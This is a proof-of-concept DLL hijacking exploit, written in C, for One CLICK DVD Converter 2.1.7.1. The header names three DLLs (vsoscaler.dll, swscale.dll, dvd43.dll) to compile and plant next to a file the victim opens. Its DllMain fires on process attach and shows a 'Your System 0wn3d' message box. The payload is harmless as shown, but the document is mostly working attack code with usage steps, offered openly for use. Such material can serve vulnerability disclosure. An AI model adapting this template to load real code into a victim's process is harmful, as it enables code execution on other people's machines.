/*
#One CLICK DVD Converter 2.1.7.1  DLL Hijacking Exploit (vsoscaler.dll ; swscale.dll ; dvd43.dll )

#Author    :   anT!-Tr0J4n

#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com

#Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends

#special thanks to : r0073r ; Sid3^effects ; L0rd CrusAd3r ; all Inj3ct0r 31337 Member

#Home     :   www.Dev-PoinT.com  $ http://inj3ct0r.com

#Software :   www.lgsoftwareinnovations.com

#Version    :   2.1.7.1

#Tested on:   Windows XP sp3




==========================
How  TO use : Compile and rename to  (vsoscaler.dll ; swscale.dll ; dvd43.dll ) , create a file in the same dir with one of the following extensions.

 check the result -> 0wn3d  
        
==========================

+ vsoscaler.dll

+ swscale.dll
 
+ dvd43.dll


*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"Your System 0wn3d BY anT!-Tr0J4n", "inj3ct0r",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}

